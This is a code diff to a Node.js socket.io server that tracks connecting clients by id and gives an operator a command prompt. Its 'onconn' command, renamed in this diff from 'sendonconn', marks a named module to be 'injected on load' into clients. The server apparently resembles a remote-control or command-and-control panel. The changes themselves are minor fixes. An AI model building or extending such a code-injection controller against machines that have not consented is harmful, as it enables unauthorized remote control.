@@ -49,7 +49,7 @@ io.on('connection', function(socket){
     checkClient(data, '[C] Client connected with id: '.green + data.id.green.bold, socket);
   });
   socket.on("beat", function(data) {
-    ent(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket);
+    checkClient(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket);
   });
   socket.on("callback",function(data) {
     var ok = false;
@@ -100,6 +100,7 @@ clog(`
   });
 
   function handlePromptInput(input) {
+    //COMMANDS
     var args = input.split(' ');
     if(args[0] == 'send') {
       if(args[1] && args[2]) {
@@ -154,11 +155,11 @@ clog(`
         clog('[M] Invalid arguments.'.red);
       }
     }
-    else if(args[0] == 'sendonconn') {
+    else if(args[0] == 'onconn') {
       if(args[1]) {
         getModuleContentsByName(args[1], function(data) {
           olm = args[1];
-          clog('[M] Module: '.green + args[1].green.bold + ' will be injected on load!');
+          clog('[M] Module: '.green + args[1].green.bold + ' will be injected on load!'.green);
         });
       } else {
         clog('[M] No module specified!'.red);
